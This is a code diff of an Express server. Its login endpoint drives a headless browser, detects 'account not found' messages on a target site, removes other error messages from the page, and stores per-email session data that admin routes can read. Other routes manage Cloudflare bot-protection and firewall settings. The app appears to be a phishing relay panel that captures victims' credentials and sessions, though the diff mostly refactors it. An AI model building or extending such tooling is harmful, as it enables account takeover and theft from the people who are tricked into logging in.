@@ -671,15 +671,12 @@ app.post('/api/login', async (req, res) => {
                         try {
                             const errorText = await element.evaluate(el => el.textContent);
                             if (errorText && errorText.trim()) {
-                                // Only capture the specific "account not found" error message
+                                // Only capture the specific "account not found" error message but don't save to session data
                                 if (errorText.includes("We couldn't find an account with that username")) {
                                     siteReport.errorMessages.push(errorText.trim());
                                     console.log(`Found error message: ${errorText.trim()}`);
                                     foundAccountNotFoundError = true;
-                                    analytics.invalidEntries++;
-                                    saveAnalytics();
-                                    saveInvalidEntry(sessionId, email, 'Account not found', errorText.trim());
-                                    console.log(`📊 Analytics: Invalid entries now ${analytics.invalidEntries}`);
+                                    console.log(`📊 Account not found error detected but not saved to session data`);
                                 } else {
                                     // Remove all other bordered error messages from HTML
                                     await element.evaluate(el => el.remove());
@@ -1466,10 +1463,9 @@ process.on('SIGQUIT', gracefulShutdown);
 app.get('/api/admin/sessions', requireAdminAuth, (req, res) => {
     const fs = require('fs');
     const path = require('path');
+    const sessionDir = path.join(__dirname, 'session_data');
 
     try {
-        const sessionDir = path.join(__dirname, 'session_data');
-
         if (!fs.existsSync(sessionDir)) {
             return res.json({ sessions: [] });
         }
@@ -1643,16 +1639,16 @@ app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
     try {
         // Get Bot Fight Mode status
         const botFightMode = await makeCloudflareRequest('/settings/bot_fight_mode');
-        
+
         // Get Security Level
         const securityLevel = await makeCloudflareRequest('/settings/security_level');
-        
+
         // Get Challenge Passage
         const challengePassage = await makeCloudflareRequest('/settings/challenge_ttl');
-        
+
         // Get Browser Integrity Check
         const browserCheck = await makeCloudflareRequest('/settings/browser_check');
-        
+
         // Get Under Attack Mode
         const underAttackMode = await makeCloudflareRequest('/settings/security_level');
 
@@ -1679,7 +1675,7 @@ app.get('/api/admin/cloudflare/status', requireAdminAuth, async (req, res) => {
 app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) => {
     try {
         const { enabled } = req.body;
-        
+
         const result = await makeCloudflareRequest('/settings/bot_fight_mode', 'PATCH', {
             value: enabled ? 'on' : 'off'
         });
@@ -1702,7 +1698,7 @@ app.post('/api/admin/cloudflare/bot-fight', requireAdminAuth, async (req, res) =
 app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, res) => {
     try {
         const { level } = req.body; // 'off', 'essentially_off', 'low', 'medium', 'high', 'under_attack'
-        
+
         const result = await makeCloudflareRequest('/settings/security_level', 'PATCH', {
             value: level
         });
@@ -1725,7 +1721,7 @@ app.post('/api/admin/cloudflare/security-level', requireAdminAuth, async (req, r
 app.post('/api/admin/cloudflare/browser-check', requireAdminAuth, async (req, res) => {
     try {
         const { enabled } = req.body;
-        
+
         const result = await makeCloudflareRequest('/settings/browser_check', 'PATCH', {
             value: enabled ? 'on' : 'off'
         });
@@ -1750,7 +1746,7 @@ app.post('/api/admin/cloudflare/firewall-rule', requireAdminAuth, async (req, re
         const { action, expression, description } = req.body;
         // action: 'block', 'allow', 'challenge', 'js_challenge'
         // expression: Cloudflare expression like 'ip.src eq 1.2.3.4'
-        
+
         const result = await makeCloudflareRequest('/firewall/rules', 'POST', {
             filter: {
                 expression: expression,
@@ -1778,7 +1774,7 @@ app.post('/api/admin/cloudflare/firewall-rule', requireAdminAuth, async (req, re
 app.get('/api/admin/cloudflare/firewall-rules', requireAdminAuth, async (req, res) => {
     try {
         const rules = await makeCloudflareRequest('/firewall/rules');
-        
+
         res.json({
             success: true,
             rules: rules
@@ -1815,7 +1811,7 @@ app.post('/api/admin/cloudflare/configure', requireAdminAuth, async (req, res) =
 
         const testResult = await testResponse.json();
 
-        if (!testResult.success) {
+        if (!testResponse.ok || !testResult.success) {
             return res.status(400).json({
                 success: false,
                 error: `Invalid credentials: ${testResult.errors?.[0]?.message || 'Authentication failed'}`
